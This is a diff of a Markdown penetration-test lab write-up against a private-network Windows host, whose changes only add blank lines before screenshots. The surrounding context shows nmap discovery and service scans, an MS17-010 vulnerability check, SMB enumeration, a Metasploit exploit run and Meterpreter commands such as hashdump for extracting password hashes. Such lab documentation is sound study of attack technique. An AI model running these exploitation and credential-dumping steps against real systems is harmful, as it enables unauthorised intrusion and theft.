@@ -72,6 +72,7 @@ sudo nmap -sn -PS22,80,443 192.168.57.20/24 -oA hosts_tcp_ping
 
 sudo nmap -sn -PR 192.168.57.20/24 -oA hosts_arp
 ```
+
 ![hosts-discovery](hosts-discovery.png)
 
 
@@ -79,6 +80,7 @@ Services:
 ```
 nmap -sV -sC -Pn -p 22,80,135,139,443,445,554,2869,3306,3389,10243 192.168.57.20 -oA service_scan
 ```
+
 ![service-scan](service-scan.png)
 
 
@@ -121,6 +123,7 @@ for host in root.findall('host'):
             print(f'  Puerto {port.get("portid")}/{port.get("protocol")}')
 "
 ```
+
 ![python-script](python-script.png)
 
 
@@ -132,11 +135,13 @@ for host in root.findall('host'):
 ```
 nmap --script smb-vuln-ms17-010 -p 445 192.168.57.20 -oN ms17_verify.txt
 ```
+
 ![ms17_verify](ms17_verify.png)
 
 ```
 nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 192.168.57.20
 ```
+
 ![smb-enumeration](smb-enumeration.png)
 
 
@@ -157,6 +162,7 @@ set LPORT 4444
 
 exploit
 ```
+
 ![metaexploit](metaexploit.png)
 
 
@@ -169,6 +175,7 @@ hashdump          # Extraer hashes de contraseñas
 ps                # Listar procesos
 screenshot        # Capturar pantalla
 ```
+
 ![meterpreter-sysinfo](meterpreter-sysinfo.png)
 
 ![meterpreter-ps](meterpreter-ps.png)
@@ -177,15 +184,19 @@ screenshot        # Capturar pantalla
 ### Additional vulnerabilites scanning
 
 1. Additional SMB vulnerabilities scanning
+
 ![smb-all-vulns](smb-all-vulns.png)
 
 2. NetBIOS vulnerabilities
+
 ![netbios-vulns](netbios-vulns.png)
 
 3. RPC scaning on port 135
+
 ![rpc-scan](rpc-scan.png)
 
 4. UPnP services verifications (on ports 2869, 5357)
+
 ![upnp-services](upnp-services.png)
 
 ```
